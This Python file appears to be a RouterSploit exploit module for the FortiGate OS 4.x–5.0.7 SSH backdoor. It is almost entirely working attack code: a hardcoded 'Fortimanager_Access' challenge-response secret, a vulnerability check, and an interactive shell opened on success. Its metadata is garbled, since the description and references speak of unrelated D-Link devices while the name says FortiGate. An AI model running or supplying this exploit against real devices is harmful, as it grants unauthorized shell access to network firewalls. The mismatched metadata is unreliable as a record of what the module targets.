import paramiko
import base64
import hashlib

from routersploit.core.exploit import *
from routersploit.core.ssh.ssh_client import SSHClient


class Exploit(SSHClient):
    __info__ = {
        "name": "FortiGate OS 4.x-5.0.7 Backdoor",
        "description": "Module exploits D-Link DNS-320L, DNS-327L Remote Code Execution vulnerability "
                       "which allows executing command on the device.",
        "authors": (
            "operator8203",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router",
            "http://www.s3cur1ty.de/home-network-horror-days",
            "http://www.s3cur1ty.de/m1adv2013-003",
        ),
        "devices": (
            "FortiGate OS Version 4.x-5.0.7",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(22, "Target SSH port")

    def run(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(self.target, self.port, username='', allow_agent=False, look_for_keys=False)
        except paramiko.ssh_exception.SSHException:
            pass
        except Exception:
            print_error("Exploit Failed - SSH Service is down")
            return

        trans = client.get_transport()
        try:
            trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except Exception:
            print_status("Error with Existing Session. Wait few minutes.")
            return

        try:
            trans.auth_interactive(username='Fortimanager_Access', handler=self.custom_handler)

            print_success("Exploit succeeded")
            ssh_interactive(client)
        except Exception:
            print_error("Exploit failed")
            return

    @mute
    def check(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(self.target, self.port, username='', allow_agent=False, look_for_keys=False)
        except paramiko.ssh_exception.SSHException:
            pass
        except Exception:
            return False  # target is not vulnerable

        trans = client.get_transport()
        try:
            trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
        except paramiko.ssh_exception.AuthenticationException:
            pass
        except Exception:
            return None  # could not verify

        try:
            trans.auth_interactive(username='Fortimanager_Access', handler=self.custom_handler)
        except Exception:
            return False  # target is not vulnerable

        return True  # target is vulnerable

    def custom_handler(self, title, instructions, prompt_list):
        n = prompt_list[0][0]
        m = hashlib.sha1()
        m.update('\x00' * 12)
        m.update(n + 'FGTAbc11*xy+Qqz27')
        m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
        h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
        return [h]
